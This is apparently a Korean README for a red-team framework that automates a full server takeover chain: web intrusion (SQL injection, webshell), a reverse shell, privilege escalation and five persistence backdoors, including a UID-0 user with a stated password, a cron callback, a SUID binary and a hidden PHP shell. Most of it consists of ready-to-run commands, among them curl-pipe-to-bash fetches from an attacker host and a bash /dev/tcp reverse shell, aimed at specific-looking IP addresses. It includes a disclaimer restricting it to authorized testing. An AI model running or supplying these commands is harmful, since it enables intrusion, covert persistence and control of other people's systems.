# Red Team 공격 시뮬레이션 프레임워크

침투 테스트 및 보안 교육을 위한 완전한 공격 체인 자동화 도구

## 빠른 시작

### 1. 공격자 서버 설정

```bash
# 공격자 서버에 스크립트 배포
./setup_attacker_server.sh <ATTACKER_IP>

# 예시
./setup_attacker_server.sh 13.158.67.78
```

### 2. 전체 공격 실행

```bash
# 완전 자동화 실행
./full_attack_chain.sh <TARGET_IP> <ATTACKER_IP>

# 예시
./full_attack_chain.sh 15.164.95.252 13.158.67.78
```

### 3. 서버 접속 확인

```bash
# SSH 백도어
ssh sysadmin@<TARGET_IP>  # 비밀번호: P@ssw0rd123!

# 또는 Root
ssh root@<TARGET_IP>
```

## 공격 체인 개요

```
초기 침투 → 후속 공격 → 권한 상승 → 백도어 설치 → 서버 장악
   (auto.py) (post_exploit) (priv_esc)  (backdoor)    (SSH 접속)
```

## 주요 파일

| 파일 | 설명 |
|------|------|
| `auto.py` | 초기 침투 (SQL Injection, XSS, CSRF, 웹쉘) |
| `post_exploit.py` | 후속 공격 (정보 수집, Reverse Shell) |
| `privilege_escalation.sh` | 권한 상승 자동화 |
| `backdoor_install.sh` | 영속성 확보 (5가지 백도어) |
| `full_attack_chain.sh` | 전체 프로세스 자동화 |
| `setup_attacker_server.sh` | 공격자 서버 초기 설정 |

## 단계별 사용법

### 방법 1: 완전 자동화 (권장)

```bash
./full_attack_chain.sh 15.164.95.252 13.158.67.78
```

### 방법 2: 수동 단계별 실행

#### 1. 초기 침투
```bash
./run_attack.sh <TARGET_IP> <ATTACKER_IP>
```

#### 2. 후속 공격
```bash
python3 post_exploit.py <TARGET_IP> <ATTACKER_IP> 4444
```

#### 3. 권한 상승 (타겟에서)
```bash
curl http://<ATTACKER_IP>:5000/scripts/privilege_escalation.sh | bash
```

#### 4. 백도어 설치 (타겟에서, root 권한)
```bash
curl http://<ATTACKER_IP>:5000/scripts/backdoor_install.sh | sudo bash -s <ATTACKER_IP>
```

#### 5. 서버 접속
```bash
ssh sysadmin@<TARGET_IP>
```

## 설치되는 백도어

1. **SSH 백도어** - authorized_keys 추가
2. **백도어 사용자** - sysadmin (UID 0)
3. **Cron 백도어** - 5분마다 연결 시도
4. **SUID 백도어** - /usr/local/bin/update-checker
5. **웹 백도어** - /.system.php

## 디렉토리 구조

```
H/
├── auto.py                     # 초기 침투
├── post_exploit.py             # 후속 공격
├── privilege_escalation.sh     # 권한 상승
├── backdoor_install.sh         # 백도어 설치
├── full_attack_chain.sh        # 전체 자동화
├── setup_attacker_server.sh    # 서버 설정
├── run_attack.sh               # auto.py 래퍼
├── clear_target_db.sh          # DB 초기화
├── update_attacker_server.sh   # 서버 업데이트
├── README.md                   # 이 파일
├── ATTACK_GUIDE.md             # 상세 가이드
├── reports/                    # 보안 리포트
│   ├── security_report_*.html
│   ├── security_report_*.json
│   ├── security_report_*.md
│   └── fake-gift.html
└── logs/                       # 공격 로그
    └── attack_*.log
```

## 요구사항

- Python 3.x
- requests, beautifulsoup4
- SSH 키 설정 (`~/.ssh/id_rsa`)
- 네트워크 접근 권한

## 설치

```bash
# Python 의존성 설치
pip3 install requests beautifulsoup4

# 실행 권한 부여
chmod +x *.sh *.py
```

## 트러블슈팅

### 웹쉘을 찾을 수 없음
```bash
curl http://<TARGET_IP>/uploads/shell.php?cmd=whoami
```

### Reverse Shell 연결 안됨
```bash
# 방화벽 확인
nc -lvnp 4444

# 수동 페이로드
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
```

### 권한 상승 실패
```bash
# 수동 확인
find / -perm -4000 -type f 2>/dev/null
sudo -l
```

## 사용 예시

### 완전 자동화
```bash
$ ./full_attack_chain.sh 15.164.95.252 13.158.67.78
============================================================
전체 공격 체인 자동화
============================================================
타겟 IP:      15.164.95.252
공격자 IP:    13.158.67.78
...
[+] 초기 침투 성공!
[+] 시스템 정보 수집 완료!
[+] 백도어 설치 완료!
[+] 서버 완전 장악!
```

### 서버 접속 확인
```bash
$ ssh sysadmin@15.164.95.252
Password: P@ssw0rd123!

[sysadmin@target ~]$ whoami
root

[sysadmin@target ~]$ id
uid=0(root) gid=0(root) groups=0(root)
```

## 보안 주의사항

⚠️ **경고**: 이 도구는 다음 목적으로만 사용하세요:
- 승인된 침투 테스트
- CTF 대회
- 보안 교육 및 연구
- 자신이 소유한 시스템 테스트

❌ **절대 금지**:
- 무단 접근 시도
- 프로덕션 시스템 공격
- 불법적인 활동

## 상세 문서

전체 가이드는 [ATTACK_GUIDE.md](ATTACK_GUIDE.md)를 참고하세요.

## 라이센스

교육 및 보안 연구 목적으로만 사용 가능합니다.

## 참고 자료

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [GTFOBins](https://gtfobins.github.io/)
- [PEASS-ng](https://github.com/carlospolop/PEASS-ng)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

**Made for security education and authorized testing only**
